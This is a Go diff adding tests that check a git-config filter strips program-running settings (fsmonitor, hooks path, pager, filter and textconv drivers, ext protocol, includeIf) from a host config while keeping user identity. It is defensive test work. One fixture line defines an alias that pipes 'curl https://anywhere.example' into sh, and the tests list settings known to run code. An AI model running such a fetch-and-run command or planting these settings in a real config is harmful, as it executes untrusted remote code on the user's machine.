@@ -1078,3 +1078,78 @@ func hasLabelPrefix(args []string, prefix string) bool {
 	}
 	return false
 }
+
+// The denylist this replaced named the settings someone thought of. These
+// are the ones it missed: every one of them runs a program.
+func TestTheGitConfigFilterDropsProgramRunningSettings(t *testing.T) {
+	h := newHarness(t)
+	h.writeHostGitConfig(t, `[user]
+	name = Real Person
+	email = real@example.com
+[core]
+	fsmonitor = /host/bin/watchman
+	hooksPath = /host/hooks
+	pager = /host/bin/less
+[filter "lfs"]
+	clean = git-lfs clean -- %f
+	smudge = git-lfs smudge -- %f
+[diff "spreadsheet"]
+	textconv = /host/bin/xlsx2csv
+[alias]
+	deploy = "!sh -c 'curl https://anywhere.example | sh'"
+[protocol "ext"]
+	allow = always
+[includeIf "gitdir:/host/work/"]
+	path = /host/work/.gitconfig
+`)
+
+	path, err := filterGitConfig(h.env)
+	if err != nil {
+		t.Fatal(err)
+	}
+	body, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	got := string(body)
+
+	for _, want := range []string{"Real Person", "real@example.com"} {
+		if !strings.Contains(got, want) {
+			t.Errorf("identity was lost: %q missing from\n%s", want, got)
+		}
+	}
+	for _, unwanted := range []string{
+		"fsmonitor", "hooksPath", "pager", "clean", "smudge", "textconv",
+		"deploy", "allow", "includeIf", "/host/",
+	} {
+		if strings.Contains(got, unwanted) {
+			t.Errorf("%q survived the filter:\n%s", unwanted, got)
+		}
+	}
+}
+
+// A carried setting under a section that also holds a dropped one must
+// still arrive, and the file must remain something git can parse.
+func TestTheGitConfigFilterKeepsSectionsIntact(t *testing.T) {
+	h := newHarness(t)
+	h.writeHostGitConfig(t, `[core]
+	autocrlf = input
+	editor = /host/bin/vim
+[pull]
+	rebase = true
+`)
+	path, err := filterGitConfig(h.env)
+	if err != nil {
+		t.Fatal(err)
+	}
+	body, _ := os.ReadFile(path)
+	got := string(body)
+	for _, want := range []string{"[core]", "autocrlf = input", "[pull]", "rebase = true"} {
+		if !strings.Contains(got, want) {
+			t.Fatalf("missing %q:\n%s", want, got)
+		}
+	}
+	if strings.Contains(got, "editor") {
+		t.Fatalf("a dropped setting survived:\n%s", got)
+	}
+}
